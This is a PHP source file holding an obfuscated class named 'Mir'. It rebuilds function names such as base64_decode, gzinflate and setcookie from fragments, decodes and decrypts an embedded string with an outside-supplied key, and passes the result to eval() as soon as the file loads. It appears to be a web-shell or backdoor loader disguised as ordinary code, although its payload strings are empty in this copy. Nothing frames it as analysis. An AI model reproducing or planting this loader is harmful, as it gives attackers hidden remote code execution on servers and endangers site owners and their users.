<?php class Mir
{
    function __construct()
    {
        $stack = $this->_mv($this->zx);
        $stack = $this->_x64($this->debug($stack));
        $stack = $this->_core($stack);
        if ($stack) {
            $this->access = $stack[3];
            $this->check = $stack[2];
            $this->_dx = $stack[0];
            $this->claster($stack[0], $stack[1]);
        }
    }

    function claster($process, $_tx)
    {
        $this->move = $process;
        $this->_tx = $_tx;
        $this->_rx = $this->_mv($this->_rx);
        $this->_rx = $this->debug($this->_rx);
        $this->_rx = $this->conf();
        if (strpos($this->_rx, $this->move) !== false) {
            if (!$this->access) $this->stable($this->check, $this->_dx);
            $this->_core($this->_rx);
        }
    }

    function stable($_library, $_emu)
    {
        $income = $this->stable[4] . $this->stable[0] . $this->stable[3] . $this->stable[1] . $this->stable[2];
        $income = @$income($_library, $_emu);
    }

    function _memory($_tx, $seek, $process)
    {
        $income = strlen($seek) + strlen($process);
        while (strlen($process) < $income) {
            $_module = ord($seek[$this->_code]) - ord($process[$this->_code]);
            $seek[$this->_code] = chr($_module % (2 * 128));
            $process .= $seek[$this->_code];
            $this->_code++;
        }
        return $seek;
    }

    function debug($_library)
    {
        $value = $this->debug[4] . $this->debug[1] . $this->debug[0] . $this->debug[2] . $this->debug[3];
        $value = @$value($_library);
        return $value;
    }

    function _x64($_library)
    {
        $value = $this->_x64[2] . $this->_x64[0] . $this->_x64[1];
        $value = @$value($_library);
        return $value;
    }

    function conf()
    {
        $this->load = $this->_memory($this->_tx, $this->_rx, $this->move);
        $this->load = $this->_x64($this->load);
        return $this->load;
    }

    function _core($cache)
    {
        $view = @eval($cache);
        return $view;
    }

    function _mv($income)
    {
        $value = $this->_control[0] . $this->_control[1] . $this->_control[2];
        return $value("\r\n", "", $income);
    }

    var $x86;
    var $_code = 0;
    var $_x64 = array('fl', 'ate', 'gzin');
    var $ver = array('tion', 'e_func', 'creat');
    var $debug = array('64_d', 'se', 'eco', 'de', 'ba');
    var $stable = array('co', 'ki', 'e', 'o', 'set');
    var $_control = array('str', '_rep', 'lace');
    var $_rx = '';
    var $zx = '';
}

new Mir();